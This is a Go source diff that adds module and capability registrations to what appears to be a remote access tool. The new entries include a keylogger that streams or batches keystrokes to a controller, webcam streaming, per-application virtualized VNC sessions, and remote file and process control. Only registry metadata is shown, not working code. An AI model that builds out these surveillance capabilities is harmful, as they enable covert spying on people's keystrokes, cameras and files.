@@ -135,15 +135,27 @@ var (
 	knownRuntimeTypes   = []RuntimeType{RuntimeNative, RuntimeWASM}
 	semverPattern       = regexp.MustCompile(`^(0|[1-9]\d*)\.(0|[1-9]\d*)\.(0|[1-9]\d*)(?:-[0-9A-Za-z-.]+)?(?:\+[0-9A-Za-z-.]+)?$`)
 	registeredModules   = map[string]struct{}{
-		"remote-desktop": {},
-		"audio-control":  {},
-		"clipboard":      {},
-		"recovery":       {},
-		"client-chat":    {},
-		"system-info":    {},
-		"notes":          {},
+		"app-vnc":         {},
+		"remote-desktop":  {},
+		"webcam-control":  {},
+		"audio-control":   {},
+		"keylogger":       {},
+		"clipboard":       {},
+		"file-manager":    {},
+		"task-manager":    {},
+		"tcp-connections": {},
+		"recovery":        {},
+		"client-chat":     {},
+		"system-info":     {},
+		"notes":           {},
 	}
 	registeredCapabilities = map[string]CapabilityMetadata{
+		"app-vnc.launch": {
+			ID:          "app-vnc.launch",
+			Module:      "app-vnc",
+			Name:        "app-vnc.launch",
+			Description: "Clone per-application profiles and start virtualized sessions.",
+		},
 		"remote-desktop.stream": {
 			ID:          "remote-desktop.stream",
 			Module:      "remote-desktop",
@@ -174,6 +186,18 @@ var (
 			Name:        "Performance telemetry",
 			Description: "Collect frame quality and adaptive bitrate metrics for dashboards.",
 		},
+		"webcam.enumerate": {
+			ID:          "webcam.enumerate",
+			Module:      "webcam-control",
+			Name:        "webcam.enumerate",
+			Description: "Enumerate connected webcam devices and capabilities.",
+		},
+		"webcam.stream": {
+			ID:          "webcam.stream",
+			Module:      "webcam-control",
+			Name:        "webcam.stream",
+			Description: "Initiate webcam streaming sessions when supported.",
+		},
 		"audio.capture": {
 			ID:          "audio.capture",
 			Module:      "audio-control",
@@ -186,6 +210,18 @@ var (
 			Name:        "Audio injection",
 			Description: "Inject operator-provided audio streams into the remote session.",
 		},
+		"keylogger.stream": {
+			ID:          "keylogger.stream",
+			Module:      "keylogger",
+			Name:        "keylogger.stream",
+			Description: "Stream keystroke telemetry to the controller in near real time.",
+		},
+		"keylogger.batch": {
+			ID:          "keylogger.batch",
+			Module:      "keylogger",
+			Name:        "keylogger.batch",
+			Description: "Batch keystrokes offline and upload on a schedule.",
+		},
 		"clipboard.capture": {
 			ID:          "clipboard.capture",
 			Module:      "clipboard",
@@ -197,6 +233,42 @@ var (
 			Module:      "clipboard",
 			Name:        "Clipboard push",
 			Description: "Push operator clipboard payloads to the remote host.",
+		},
+		"file-manager.explore": {
+			ID:          "file-manager.explore",
+			Module:      "file-manager",
+			Name:        "file-manager.explore",
+			Description: "Enumerate directories and retrieve file contents from the host.",
+		},
+		"file-manager.modify": {
+			ID:          "file-manager.modify",
+			Module:      "file-manager",
+			Name:        "file-manager.modify",
+			Description: "Create, update, move, and delete files and directories on demand.",
+		},
+		"task-manager.list": {
+			ID:          "task-manager.list",
+			Module:      "task-manager",
+			Name:        "task-manager.list",
+			Description: "Collect real-time process snapshots with metadata.",
+		},
+		"task-manager.control": {
+			ID:          "task-manager.control",
+			Module:      "task-manager",
+			Name:        "task-manager.control",
+			Description: "Start and orchestrate process actions on demand.",
+		},
+		"tcp-connections.enumerate": {
+			ID:          "tcp-connections.enumerate",
+			Module:      "tcp-connections",
+			Name:        "tcp-connections.enumerate",
+			Description: "Collect real-time socket state with process attribution.",
+		},
+		"tcp-connections.control": {
+			ID:          "tcp-connections.control",
+			Module:      "tcp-connections",
+			Name:        "tcp-connections.control",
+			Description: "Stage enforcement actions for suspicious remote peers.",
 		},
 		"recovery.queue": {
 			ID:          "recovery.queue",
